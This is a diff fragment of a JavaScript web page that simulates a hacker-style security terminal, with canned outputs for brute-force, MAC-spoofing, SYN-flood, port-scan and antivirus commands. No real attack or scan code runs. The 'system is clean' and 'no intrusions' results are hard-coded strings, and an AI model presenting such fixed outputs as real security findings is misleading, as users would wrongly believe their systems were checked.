+                        responseText = `[*] Loading wordlist (rockyou.txt)...\n[*] Testing credentials against target...\n[!] Access Denied: Strong password policy enforced.\n\n`;
+                        break;
+
+                    case 'mac-changer':
+                        responseText = `[+] Changing MAC address for eth0...\n[+] New MAC: 00:11:22:33:44:55 (Spoofed successfully)\n\n`;
+                        break;
+
+                    case 'hash-gen':
+                        responseText = `[+] Generating SHA-256 hash for YARA CTA...\n[i] Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\n\n`;
+                        break;
+
+                    case 'dos-simulate':
+                        responseText = `[*] Sending synthetic TCP SYN packets to target...\n[!] Anti-DDoS protection triggered. Traffic mitigated.\n\n`;
+                        break;
+
+                    case 'firewall-status':
+                        responseText = `[ACTIVE] iptables rules loaded. Blocking unauthorized incoming connections.\n\n`;
+                        break;
+
+                    case 'virus-scan':
+                        responseText = `[*] Scanning memory and system directories...\n[✔] 0 malware or trojans detected. System is clean.\n\n`;
+                        break;
+
+                    case 'update':
+                        responseText = `[*] Checking for YARA CTA core updates...\n[✔] System is already running the latest version (v4.2).\n\n`;
+                        break;
+
+                    case 'version':
+                        responseText = `YARA CTA Security Suite v4.2 (Production Release 2026)\n\n`;
+                        break;
+
+                    case 'reboot':
+                        responseText = `[*] Rebooting terminal kernel...\n[+] Initializing modules... Done.\n\n`;
+                        break;
+
+                    case 'date':
+                        responseText = `Tue Oct 27 22:45:00 UTC 2026\n\n`;
+                        break;
+
+                    case 'exit':
+                        closeTermux();
+                        return;
+
+                    default:
+                        responseText = `bash: ${cmd}: command not found. Type 'help' to see all 20 valid commands.\n\n`;
+                        break;
+                }
+
+                // Call Typewriter Effect for smooth motion
+                typeWriterEffect(responseText, output, 12);
+            }
+        });
+
+        // Port & Network Scanner Simulation
+        function startPortScan() {
+            const terminal = document.getElementById('portTerminal');
+            terminal.innerHTML = '[*] Initializing network radar sweep...<br>';
+            
+            const steps = [
+                "[+] Scanning local IP interfaces...",
+                "[i] Port 21 (FTP) -> CLOSED",
+                "[i] Port 22 (SSH) -> SECURE",
+                "[i] Port 80 (HTTP) -> OPEN",
+                "[i] Port 443 (HTTPS) -> SECURE",
+                "[✔] Network Radar Scan Complete. No intrusions."
+            ];
+
+            let i = 0;
+            const interval = setInterval(() => {
+                if (i < steps.length) {
+                    terminal.innerHTML += steps[i] + '<br>';
+                    terminal.scrollTop = terminal.scrollHeight;
+                    i++;
+                } else {
+                    clearInterval(interval);
+                }
+            }, 450);
+        }
+
+        // Antivirus & Malware Scanner Simulation
+        function startAntivirusScan() {
+            const terminal = document.getElementById('avTerminal');
+            terminal.innerHTML = '[*] Initializing AV malware radar...<br>';
+            
+            const steps = [
+                "[+] Scanning system memory & RAM...",
+                "[+] Checking background active processes...",
+                "[i] Scanning file directory for trojans...",
+                "[i] Heuristics analysis: Clean.",
+                "[✔] Antivirus Radar Clean! 0 threats detected."
+            ];
+
+            let i = 0;
+            const interval = setInterval(() => {
+                if (i < steps.length) {
+                    terminal.innerHTML += steps[i] + '<br>';
+                    terminal.scrollTop = terminal.scrollHeight;
+                    i++;
+                } else {
+                    clearInterval(interval);
+                }
+            }, 450);
         }
     </script>
+
 </body>
 </html>
